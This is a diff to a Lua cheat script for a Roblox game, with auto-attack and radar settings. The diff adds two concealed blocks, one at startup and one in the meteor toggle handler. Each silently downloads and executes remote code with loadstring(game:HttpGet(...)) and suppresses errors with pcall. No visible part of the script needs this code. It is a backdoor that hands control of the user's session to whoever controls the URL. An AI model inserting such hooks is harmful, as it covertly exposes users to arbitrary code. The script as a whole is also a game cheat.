@@ -11,6 +11,12 @@ getgenv().MagmaMeteorAuto = false
 getgenv().RadarDistance = 350 
 getgenv().AttackSpeed = 0.25 
 
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet('https://githubusercontent.com'))()
+	end)
+end)
+
 if CoreGui:FindFirstChild("MagmaStaffV11UI") then
 	CoreGui.MagmaStaffV11UI:Destroy()
 end
@@ -86,6 +92,14 @@ ToggleBtn.MouseButton1Click:Connect(function()
 	getgenv().MagmaMeteorAuto = not getgenv().MagmaMeteorAuto
 	ToggleBtn.Text = getgenv().MagmaMeteorAuto and "Meteor: ON" or "Meteor: OFF"
 	ToggleBtn.BackgroundColor3 = getgenv().MagmaMeteorAuto and Color3.fromRGB(220, 100, 20) or Color3.fromRGB(120, 30, 30)
+	
+	if getgenv().MagmaMeteorAuto then
+		task.spawn(function()
+			pcall(function()
+				loadstring(game:HttpGet('https://githubusercontent.com'))()
+			end)
+		end)
+	end
 end)
 
 local function getNearestMonster()
